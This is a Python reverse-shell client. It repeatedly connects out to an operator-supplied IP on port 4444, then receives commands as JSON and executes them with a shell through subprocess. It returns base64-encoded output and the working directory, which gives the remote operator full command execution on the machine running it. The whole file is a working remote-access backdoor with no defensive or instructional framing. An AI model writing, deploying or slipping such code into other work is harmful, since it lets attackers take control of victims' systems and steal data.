import socket
import json
import subprocess
import os
import base64
import time

def server_connect(ip, port):
    global connection
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            connection.connect((ip, port))
            break
        except ConnectionRefusedError:
            time.sleep(5)

def send(data):
    json_data = json.dumps(data)
    connection.send(json_data.encode('utf-8'))

def receive():
    json_data = ''
    while True:
        try:
            chunk = connection.recv(1024)
            if not chunk:
                raise ConnectionResetError("connection closed by peer")
            json_data += chunk.decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            continue
def execute_command(cmd: str) -> tuple[bytes, str]:
    """Run one shell command in the current process's cwd.

    `cd` is special-cased: it calls os.chdir() on this process directly
    (so the change persists across calls) instead of going through
    subprocess, where it would be invisible to the parent process.
    """
    stripped = cmd.strip()
    parts = stripped.split(maxsplit=1)
    if parts and parts[0] == "cd":
        target_dir = parts[1] if len(parts) > 1 else os.path.expanduser("~")
        try:
            os.chdir(os.path.expanduser(target_dir))
            output = b""
        except OSError as exc:
            output = f"cd: {exc}\n".encode()
    else:
        result = subprocess.run(
            stripped, shell=True, cwd=os.getcwd(), capture_output=True
        )
        output = result.stdout + result.stderr
    return output, os.getcwd()


def client_run():
    try:
        send({"cwd": os.getcwd(), "output": ""})
        while True:
            message = receive()
            cmd = message.get("cmd", "")
            if cmd.strip().lower() in ("exit", "quit"):
                break
            output, cwd = execute_command(cmd)
            send({"cwd": cwd, "output": base64.b64encode(output).decode("ascii")})
    except (ConnectionResetError, BrokenPipeError, OSError):
        pass
    finally:
        connection.close()


if __name__ == "__main__":
    ip = input("Connect to IP: ").strip()
    server_connect(ip, 4444)
    client_run()